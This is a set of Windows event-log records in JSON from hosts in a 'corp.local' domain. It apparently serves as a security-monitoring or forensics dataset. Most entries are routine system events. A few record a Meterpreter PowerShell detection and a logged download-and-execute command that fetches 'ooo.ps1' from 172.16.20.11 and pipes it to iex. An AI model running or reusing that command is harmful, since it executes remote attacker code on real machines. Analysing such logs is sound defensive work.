{"EventTime":"2021-09-14T10:55:57.837505+05:45","Hostname":"IT03.corp.local","Keywords":"9259400833873739776","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":7042,"SourceName":"Service Control Manager","ProviderGuid":"{555908D1-A6D7-4695-8E1E-26931D2012F4}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":107272,"ExecutionProcessID":612,"ExecutionThreadID":608,"Channel":"System","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"The lmhosts service was successfully sent a stop control.\r\n\r\n The reason specified was: 0x40030011 [Operating System: Network Connectivity (Planned)]\r\n\r\n Comment: None","param1":"lmhosts","param2":"stop","param3":"0x40030011","param4":"Operating System: Network Connectivity (Planned)","param5":"None","EventReceivedTime":"2021-09-14T10:56:47.225759+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-14T10:57:25.063673+05:45","Hostname":"IT03.corp.local","Keywords":"9223372036854775808","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1502,"SourceName":"Microsoft-Windows-GroupPolicy","ProviderGuid":"{AEA1B4FA-97D1-45F2-A64C-4D69FFFD92C9}","Version":0,"TaskValue":0,"OpcodeValue":1,"RecordNumber":107337,"ActivityID":"{F3A314BA-5BC6-4EE0-B4B4-70668B78E353}","ExecutionProcessID":1520,"ExecutionThreadID":4308,"Channel":"System","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"The Group Policy settings for the computer were processed successfully. New settings from 8 Group Policy objects were detected and applied.","Opcode":"Start","SupportInfo1":"1","SupportInfo2":"4213","ProcessingMode":"1","ProcessingTimeInMilliseconds":"48437","DCName":"\\\\DC01.corp.local","NumberOfGroupPolicyObjects":"8","EventReceivedTime":"2021-09-14T10:57:26.155003+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-14T10:57:25.558419+05:45","Hostname":"IT03.corp.local","Keywords":"9232379236109516800","EventType":"AUDIT_SUCCESS","SeverityValue":2,"Severity":"INFO","EventID":4954,"SourceName":"Microsoft-Windows-Security-Auditing","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":0,"TaskValue":13571,"OpcodeValue":0,"RecordNumber":40710496,"ActivityID":"{C4CABCCB-A926-0000-82BE-CAC426A9D701}","ExecutionProcessID":632,"ExecutionThreadID":2204,"Channel":"Security","Message":"Group Policy settings for Windows Firewall were changed, and the new settings were applied.","Category":"MPSSVC Rule-Level Policy Change","Opcode":"Info","EventData":"","EventReceivedTime":"2021-09-14T10:57:26.186262+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-14T10:57:25.557640+05:45","Hostname":"IT03.corp.local","Keywords":"9223372036854775808","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":2008,"SourceName":"Microsoft-Windows-Windows Firewall With Advanced Security","ProviderGuid":"{D1BC9AFF-2ABF-4D71-9146-ECB2A986EB85}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":4024,"ExecutionProcessID":1404,"ExecutionThreadID":1812,"Channel":"Microsoft-Windows-Windows Firewall With Advanced Security/Firewall","Domain":"NT AUTHORITY","AccountName":"LOCAL SERVICE","UserID":"S-1-5-19","AccountType":"Well Known Group","Message":"Windows Defender Firewall Group Policy settings have changed. The new settings have been applied","Opcode":"Info","EventData":"","EventReceivedTime":"2021-09-14T10:57:27.280452+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-14T15:32:33.713341+05:45","Hostname":"DC01.corp.local","Keywords":"9223372036854775808","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":47,"SourceName":"Microsoft-Windows-Time-Service","ProviderGuid":"{06EDCFEB-0FD0-4E53-ACCA-A6F8BBF81BCB}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":644979,"ExecutionProcessID":940,"ExecutionThreadID":384,"Channel":"System","Domain":"NT AUTHORITY","AccountName":"LOCAL SERVICE","UserID":"S-1-5-19","AccountType":"Well Known Group","Message":"Time Provider NtpClient: No valid response has been received from manually configured peer 1.uk.pool.ntp.org,0x1 after 8 attempts to contact it. This peer will be discarded as a time source and NtpClient will attempt to discover a new peer with this DNS name. The error was: The peer is unreachable. ","Opcode":"Info","ManualPeer":"1.uk.pool.ntp.org,0x1","ErrorMessage":"The peer is unreachable. ","EventReceivedTime":"2021-09-14T15:32:34.822781+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-07T11:54:52.544999+05:45","Hostname":"DC01.corp.local","Keywords":"288230376151711808","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":30807,"SourceName":"Microsoft-Windows-SMBClient","ProviderGuid":"{988C59C5-0A1C-45B6-A555-0C62276E327D}","Version":2,"TaskValue":0,"OpcodeValue":0,"RecordNumber":1285,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Microsoft-Windows-SmbClient/Connectivity","Message":"The connection to the share was lost.\r\n\r\nError: The transport connection is now disconnected.\r\n\r\nShare name: \\winserver2019\\IPC$\r\nSession ID: 0xA40000000035\r\nTree ID: 0x1\r\n\r\nGuidance:\r\nIf the server is a Windows Failover Cluster file server, then this message occurs when the file share moves between cluster nodes. There should also be an anti-event 30808 indicating the session to the server was re-established. If the server is not a failover cluster, it is likely that the server was previously online, but it is now inaccessible over the network.","Opcode":"Info","Status":"3221225996","SessionId":"180319906955317","TreeId":"1","ServerNameLength":"19","ServerName":"\\winserver2019\\IPC$","AddressLength":"0","EventReceivedTime":"2021-09-07T11:54:54.310823+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-07T11:54:52.544999+05:45","Hostname":"DC01.corp.local","Keywords":"288230376151711808","EventType":"ERROR","SeverityValue":4,"Severity":"ERROR","EventID":30804,"SourceName":"Microsoft-Windows-SMBClient","ProviderGuid":"{988C59C5-0A1C-45B6-A555-0C62276E327D}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":1283,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Microsoft-Windows-SmbClient/Connectivity","Message":"The network connection failed.\r\n\r\nError: The transport connection is now disconnected.\r\n\r\nServer name: \\winserver2019\r\nServer address: 192.168.2.108:445\r\nConnection type: Wsk\r\n\r\nGuidance:\r\nThis indicates a problem with the underlying network or transport, such as with TCP/IP, and not with SMB. A firewall that blocks port 445 or 5445 can also cause this issue.","Opcode":"Info","Reason":"7","Status":"3221225996","ServerNameLength":"14","ServerName":"\\winserver2019","AddressLength":"16","Address":"020001BDC0A8026C0000000000000000","ConnectionType":"1","EventReceivedTime":"2021-09-07T11:54:54.310823+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-07T11:54:52.544999+05:45","Hostname":"DC01.corp.local","Keywords":"288230376151711808","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":30805,"SourceName":"Microsoft-Windows-SMBClient","ProviderGuid":"{988C59C5-0A1C-45B6-A555-0C62276E327D}","Version":2,"TaskValue":0,"OpcodeValue":0,"RecordNumber":1284,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Microsoft-Windows-SmbClient/Connectivity","Message":"The client lost its session to the server.\r\n\r\nError: The transport connection is now disconnected.\r\n\r\nServer name: \\winserver2019\r\nSession ID: 0xA40000000035\r\n\r\nGuidance:\r\nIf the server is a Windows Failover Cluster file server, then this message occurs when the file share moves between cluster nodes. There should also be an anti-event 30806 indicating the session to the server was re-established. If the server is not a failover cluster, it is likely that the server was previously online, but it is now inaccessible over the network.","Opcode":"Info","Status":"3221225996","SessionId":"180319906955317","TreeId":"0","ServerNameLength":"14","ServerName":"\\winserver2019","AddressLength":"0","EventReceivedTime":"2021-09-07T11:54:54.310823+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-06T13:23:16.289377+05:45","Hostname":"IT02.corp.local","Keywords":"36028797018963968","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":8230,"SourceName":"Microsoft-Windows-Security-SPP","ProviderGuid":"{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":68338,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Application","Message":"The rules engine successfully re-evaluated the schedule.\r\nKernel policies:\r\nSecurity-SPP-Action-StateData (REG_SZ) =AppId=55c92734-d682-4d71-983e-d6ec3f16059f;GraceEndDate=2021/10/06:07:38:15;LastConsumptionReason=0x4004f040;LastNotificationId=VolumeRenewalRequired;LicenseState=SL_LICENSING_STATUS_LICENSED;PartialProductKey=T83GX;ProductKeyType=Volume:GVLK;SkuId=2de67392-b7a7-462a-b1ca-108dd189f588;ruleId=502ff3ba-669a-4674-bbb1-601f34a3b968;uxDifferentiator=ENVIRONMENT;volumeActivationOrder=normal","Data":"Security-SPP-Action-StateData (REG_SZ) =AppId=55c92734-d682-4d71-983e-d6ec3f16059f;GraceEndDate=2021/10/06:07:38:15;LastConsumptionReason=0x4004f040;LastNotificationId=VolumeRenewalRequired;LicenseState=SL_LICENSING_STATUS_LICENSED;PartialProductKey=T83GX;ProductKeyType=Volume:GVLK;SkuId=2de67392-b7a7-462a-b1ca-108dd189f588;ruleId=502ff3ba-669a-4674-bbb1-601f34a3b968;uxDifferentiator=ENVIRONMENT;volumeActivationOrder=normal","EventReceivedTime":"2021-09-06T13:23:17.021948+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-04T08:44:51.416700+05:45","Hostname":"DC01.corp.local","Keywords":"288230376151711808","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":30808,"SourceName":"Microsoft-Windows-SMBClient","ProviderGuid":"{988C59C5-0A1C-45B6-A555-0C62276E327D}","Version":2,"TaskValue":0,"OpcodeValue":0,"RecordNumber":1279,"ExecutionProcessID":4,"ExecutionThreadID":5752,"Channel":"Microsoft-Windows-SmbClient/Connectivity","Message":"The connection to the share was re-established.\r\n\r\nShare name: \\corp.local\\IPC$\r\nServer address: 192.168.2.47:445\r\nSession ID: 0x1480BF8000025\r\nTree ID: 0x1\r\n\r\nGuidance:\r\nYou should expect this event if there was a previous event 30807, but the client successfully resumed the cached connection before the timeout expired.","Opcode":"Info","Status":"0","SessionId":"360691219300389","TreeId":"1","ServerNameLength":"25","ServerName":"\\corp.local\\IPC$","AddressLength":"16","Address":"020001BDC0A8022F0000000000000000","EventReceivedTime":"2021-09-04T08:44:52.822920+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-04T08:44:51.416700+05:45","Hostname":"DC01.corp.local","Keywords":"288230376151711808","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":30806,"SourceName":"Microsoft-Windows-SMBClient","ProviderGuid":"{988C59C5-0A1C-45B6-A555-0C62276E327D}","Version":2,"TaskValue":0,"OpcodeValue":0,"RecordNumber":1278,"ExecutionProcessID":4,"ExecutionThreadID":3104,"Channel":"Microsoft-Windows-SmbClient/Connectivity","Message":"The client re-established its session to the server.\r\n\r\nServer name: \\corp.local\r\nServer address: 192.168.2.47:445\r\nSession ID: 0x1480BF8000025\r\n\r\nGuidance:\r\nYou should expect this event if there was a previous event 30805, but the client successfully resumed the cached connection before the timeout expired.","Opcode":"Info","Status":"0","SessionId":"360691219300389","TreeId":"0","ServerNameLength":"20","ServerName":"\\corp.local","AddressLength":"16","Address":"020001BDC0A8022F0000000000000000","EventReceivedTime":"2021-09-04T08:44:52.822920+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-02T13:13:13.952126+05:45","Hostname":"IT02.corp.local","Keywords":"9223372036854775808","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":1116,"SourceName":"Microsoft-Windows-Windows Defender","ProviderGuid":"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":21975,"ExecutionProcessID":6828,"ExecutionThreadID":5740,"Channel":"Microsoft-Windows-Windows Defender/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Microsoft Defender Antivirus has detected malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Meterpreter.gen!A&threatid=2147727753&enterprise=0\r\n \tName: Trojan:PowerShell/Meterpreter.gen!A\r\n \tID: 2147727753\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: amsi:_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n \tDetection Origin: Unknown\r\n \tDetection Type: Concrete\r\n \tDetection Source: AMSI\r\n \tUser: CORP\\Leo\r\n \tProcess Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n \tSecurity intelligence Version: AV: 1.347.844.0, AS: 1.347.844.0, NIS: 1.347.844.0\r\n \tEngine Version: AM: 1.1.18400.5, NIS: 1.1.18400.5","Opcode":"Info","Product Name":"Microsoft Defender Antivirus","Product Version":"4.18.2107.4","Detection ID":"{FAA23698-A60C-4DE2-AC6E-8E5D5827CB2F}","Detection Time":"2021-09-02T07:26:08.733Z","Threat ID":"2147727753","Threat Name":"Trojan:PowerShell/Meterpreter.gen!A","Severity ID":"5","Severity Name":"Severe","Category ID":"8","Category Name":"Trojan","FWLink":"https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Meterpreter.gen!A&threatid=2147727753&enterprise=0","Status Code":"1","State":"1","Source ID":"10","Source Name":"AMSI","Process Name":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Detection User":"CORP\\Leo","Path":"amsi:_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Origin ID":"0","Origin Name":"Unknown","Execution ID":"1","Execution Name":"Suspended","Type ID":"0","Type Name":"Concrete","Pre Execution Status":"0","Action ID":"9","Action Name":"Not Applicable","Error Code":"0x00000000","Error Description":"The operation completed successfully. ","Post Clean Status":"0","Additional Actions ID":"0","Additional Actions String":"No additional actions required","Security intelligence Version":"AV: 1.347.844.0, AS: 1.347.844.0, NIS: 1.347.844.0","Engine Version":"AM: 1.1.18400.5, NIS: 1.1.18400.5","EventReceivedTime":"2021-09-02T13:13:15.965845+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-02T13:15:46.054286+05:45","Hostname":"IT02.corp.local","Keywords":"9223372036854775808","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1117,"SourceName":"Microsoft-Windows-Windows Defender","ProviderGuid":"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":21976,"ExecutionProcessID":6828,"ExecutionThreadID":5740,"Channel":"Microsoft-Windows-Windows Defender/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Meterpreter.gen!A&threatid=2147727753&enterprise=0\r\n \tName: Trojan:PowerShell/Meterpreter.gen!A\r\n \tID: 2147727753\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: amsi:_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n \tDetection Origin: Unknown\r\n \tDetection Type: Concrete\r\n \tDetection Source: AMSI\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.347.844.0, AS: 1.347.844.0, NIS: 1.347.844.0\r\n \tEngine Version: AM: 1.1.18400.5, NIS: 1.1.18400.5","Opcode":"Info","Product Name":"Microsoft Defender Antivirus","Product Version":"4.18.2107.4","Detection ID":"{FAA23698-A60C-4DE2-AC6E-8E5D5827CB2F}","Detection Time":"2021-09-02T07:26:08.733Z","Threat ID":"2147727753","Threat Name":"Trojan:PowerShell/Meterpreter.gen!A","Severity ID":"5","Severity Name":"Severe","Category ID":"8","Category Name":"Trojan","FWLink":"https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Meterpreter.gen!A&threatid=2147727753&enterprise=0","Status Code":"3","State":"2","Source ID":"10","Source Name":"AMSI","Process Name":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Detection User":"CORP\\Leo","Path":"amsi:_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Origin ID":"0","Origin Name":"Unknown","Execution ID":"1","Execution Name":"Suspended","Type ID":"0","Type Name":"Concrete","Pre Execution Status":"3","Action ID":"2","Action Name":"Quarantine","Error Code":"0x00000000","Error Description":"The operation completed successfully. ","Post Clean Status":"0","Additional Actions ID":"0","Additional Actions String":"No additional actions required","Remediation User":"NT AUTHORITY\\SYSTEM","Security intelligence Version":"AV: 1.347.844.0, AS: 1.347.844.0, NIS: 1.347.844.0","Engine Version":"AM: 1.1.18400.5, NIS: 1.1.18400.5","EventReceivedTime":"2021-09-02T13:15:47.635520+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-02T13:11:08.757793+05:45","Hostname":"IT02.corp.local","Keywords":"36028797018963968","EventType":"WARNING","SeverityValue":3,"Severity":"WARNING","EventID":200,"SourceName":"PowerShell","Version":0,"TaskValue":2,"OpcodeValue":0,"RecordNumber":2055382,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Windows PowerShell","Message":"Command Health: At line:1 char:1\r\n+ $CbLxFVptxxRR = @\"\r\n+ ~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.. \r\n\r\nDetails: \r\n\tExceptionClass=CmdletInvocationException\r\n\tErrorCategory=ParserError\r\n\tErrorId=ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n\tErrorMessage=At line:1 char:1\r\n+ $CbLxFVptxxRR = @\"\r\n+ ~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\r\n\r\n\tSeverity=Warning\r\n\r\n\tSequenceNumber=50\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.868\r\n\tHostId=ff2e10a3-42e6-4e79-9e1a-e177dbb1d275\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.868\r\n\tRunspaceId=42bdd659-9cf6-41ff-a878-8eeea3dd119f\r\n\tPipelineId=7\r\n\tCommandName=Invoke-Expression\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=iwr -useb 172.16.20.11:8080/ooo.ps1 | iex","Category":"Command Health","Opcode":"Info","Data":"At line:1 char:1\n+ $CbLxFVptxxRR = @\"\n+ ~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.","Data_1":"\tExceptionClass=CmdletInvocationException\n\tErrorCategory=ParserError\n\tErrorId=ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\n\tErrorMessage=At line:1 char:1\n+ $CbLxFVptxxRR = @\"\n+ ~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\n\n\tSeverity=Warning\n\n\tSequenceNumber=50\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.868\n\tHostId=ff2e10a3-42e6-4e79-9e1a-e177dbb1d275\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.868\n\tRunspaceId=42bdd659-9cf6-41ff-a878-8eeea3dd119f\n\tPipelineId=7\n\tCommandName=Invoke-Expression\n\tCommandType=Cmdlet\n\tScriptName=\n\tCommandPath=\n\tCommandLine=iwr -useb 172.16.20.11:8080/ooo.ps1 | iex","EventReceivedTime":"2021-09-02T13:11:09.565762+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-01T10:43:05.098665+05:45","Hostname":"IT03.corp.local","Keywords":"9259400833873739776","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":4109,"SourceName":"Microsoft-Windows-CAPI2","ProviderGuid":"{5BBCA4A8-B209-48DC-A8C7-B23D3E5216FB}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":27477,"ExecutionProcessID":2488,"ExecutionThreadID":3688,"Channel":"Application","Message":"Successful auto property update of third-party root certificate:: Subject: <CN=DigiCert Global Root G2, OU=www.digicert.com, O=DigiCert Inc, C=US> Sha1 thumbprint: <DF3C24F9BFD666761B268073FE06D1CC8D4F82A4>.","Opcode":"Info","EventData":"<Data>CN=DigiCert Global Root G2, OU=www.digicert.com, O=DigiCert Inc, C=US</Data><Data>DF3C24F9BFD666761B268073FE06D1CC8D4F82A4</Data>","EventReceivedTime":"2021-09-01T10:43:06.379915+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-01T14:55:52.680911+05:45","Hostname":"IT02.corp.local","Keywords":"36028797018963968","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11708,"SourceName":"MsiInstaller","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":67802,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Application","Domain":"CORP","AccountName":"Leo","UserID":"S-1-5-21-2569713578-3403938347-3732993993-1139","AccountType":"User","Message":"Product: AteraAgent -- Installation failed.","Opcode":"Info","Data":"Product: AteraAgent -- Installation failed.","Data_1":"(NULL)","Data_2":"(NULL)","Data_3":"(NULL)","Data_4":"(NULL)","Data_5":"(NULL)","EventData.Binary":"7B39313835344637322D323741312D343044412D413732352D4433353137453132374330447D","EventReceivedTime":"2021-09-01T14:55:53.556058+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-01T14:55:52.525175+05:45","Hostname":"IT02.corp.local","Keywords":"36028797018963968","EventType":"ERROR","SeverityValue":4,"Severity":"ERROR","EventID":11925,"SourceName":"MsiInstaller","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":67801,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Application","Domain":"CORP","AccountName":"Leo","UserID":"S-1-5-21-2569713578-3403938347-3732993993-1139","AccountType":"User","Message":"Product: AteraAgent -- Error 1925. You do not have sufficient privileges to complete this installation for all users of the machine.  Log on as administrator and then retry this installation.","Opcode":"Info","Data":"Product: AteraAgent -- Error 1925. You do not have sufficient privileges to complete this installation for all users of the machine.  Log on as administrator and then retry this installation.","Data_1":"(NULL)","Data_2":"(NULL)","Data_3":"(NULL)","Data_4":"(NULL)","Data_5":"(NULL)","EventData.Binary":"7B39313835344637322D323741312D343044412D413732352D4433353137453132374330447D","EventReceivedTime":"2021-09-01T14:55:52.555885+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-01T15:57:02.742787+05:45","Hostname":"IT02.corp.local","Keywords":"9223372036854775808","EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":10003,"SourceName":"Microsoft-Windows-RestartManager","ProviderGuid":"{0888E5EF-9B98-4695-979D-E92CE4247224}","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":67840,"ExecutionProcessID":4756,"ExecutionThreadID":7344,"Channel":"Application","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Restarting application or service 'AteraAgent'.","Opcode":"Info","RmApplicationEvent.RmSessionId":"0","RmApplicationEvent.FullPath":"AteraAgent.exe","RmApplicationEvent.DisplayName":"AteraAgent","RmApplicationEvent.AppVersion":"0","RmApplicationEvent.AppType":"3","RmApplicationEvent.TSSessionId":"0","RmApplicationEvent.Status":"262155","RmApplicationEvent.Pid":"9828","RmApplicationEvent.nFiles":"0","EventReceivedTime":"2021-09-01T15:57:04.285588+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-09-01T16:00:38.158698+05:45","Hostname":"IT02.corp.local","Keywords":"36028797018963968","EventType":"ERROR","SeverityValue":4,"Severity":"ERROR","EventID":1026,"SourceName":".NET Runtime","Version":0,"TaskValue":0,"OpcodeValue":0,"RecordNumber":67848,"ExecutionProcessID":0,"ExecutionThreadID":0,"Channel":"Application","Message":"Application: AgentPackageTicketing.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.IO.FileNotFoundException\n   at AgentPackageTicketing.DownloadAndUnzipNuget.ExtractZipFile(System.IO.MemoryStream, System.String)\n   at AgentPackageTicketing.DownloadAndUnzipNuget.Run()\n   at AgentPackageTicketing.Program.Main(System.String[])\n\n","Opcode":"Info","Data":"Application: AgentPackageTicketing.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.IO.FileNotFoundException\n   at AgentPackageTicketing.DownloadAndUnzipNuget.ExtractZipFile(System.IO.MemoryStream, System.String)\n   at AgentPackageTicketing.DownloadAndUnzipNuget.Run()\n   at AgentPackageTicketing.Program.Main(System.String[])\n\n","EventReceivedTime":"2021-09-01T16:00:39.096203+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-27T13:03:47.002016+05:45","Hostname":"IT01.corp.local","Keywords":"9232379236109516800","EventType":"AUDIT_SUCCESS","SeverityValue":2,"Severity":"INFO","EventID":5156,"SourceName":"Microsoft-Windows-Security-Auditing","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":1,"TaskValue":12810,"OpcodeValue":0,"RecordNumber":4025408,"ExecutionProcessID":4,"ExecutionThreadID":2580,"Channel":"Security","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t2316\r\n\tApplication Name:\t\\device\\harddiskvolume2\\program files\\nxlog\\nxlog.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t192.168.2.46\r\n\tSource Port:\t\t49694\r\n\tDestination Address:\t192.168.4.132\r\n\tDestination Port:\t\t514\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t82874\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","Opcode":"Info","ProcessID":"2316","Application":"\\device\\harddiskvolume2\\program files\\nxlog\\nxlog.exe","Direction":"%%14593","SourceAddress":"192.168.2.46","SourcePort":"49694","DestAddress":"192.168.4.132","DestPort":"514","Protocol":"6","FilterRTID":"82874","LayerName":"%%14611","LayerRTID":"48","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0","EventReceivedTime":"2021-08-27T13:03:56.670598+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
{"EventTime":"2021-08-27T13:03:47.099771+05:45","Hostname":"IT01.corp.local","Keywords":"9232379236109516800","EventType":"AUDIT_SUCCESS","SeverityValue":2,"Severity":"INFO","EventID":5158,"SourceName":"Microsoft-Windows-Security-Auditing","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":0,"TaskValue":12810,"OpcodeValue":0,"RecordNumber":4025478,"ExecutionProcessID":4,"ExecutionThreadID":2580,"Channel":"Security","Message":"The Windows Filtering Platform has permitted a bind to a local port.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t376\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t0.0.0.0\r\n\tSource Port:\t\t49887\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t0\r\n\tLayer Name:\t\tResource Assignment\r\n\tLayer Run-Time ID:\t36","Category":"Filtering Platform Connection","Opcode":"Info","ProcessId":"376","Application":"\\device\\harddiskvolume2\\windows\\system32\\svchost.exe","SourceAddress":"0.0.0.0","SourcePort":"49887","Protocol":"6","FilterRTID":"0","LayerName":"%%14608","LayerRTID":"36","EventReceivedTime":"2021-08-27T13:03:56.811213+05:45","SourceModuleName":"in_win","SourceModuleType":"im_msvistalog"}
